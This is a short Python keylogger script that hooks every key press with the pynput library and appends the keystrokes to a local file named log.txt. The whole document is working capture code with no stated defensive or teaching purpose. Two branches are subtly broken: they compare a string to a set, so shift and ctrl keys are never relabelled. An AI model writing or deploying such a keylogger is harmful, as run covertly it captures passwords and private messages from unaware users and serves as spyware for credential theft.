from pynput.keyboard import Listener

log_file = "log.txt"

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.backspace':
        letter = '<backspace>'
    elif letter == {'Key.shift', 'Key.shift_l', 'Key.shift_r'}:
            letter = '<shift>'
    elif letter == {'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r'}:
            letter = '<ctrl>'

    with open(log_file,"a") as file:
        file.write(letter)

with Listener(on_press= write_to_file) as listen:
    listen.join()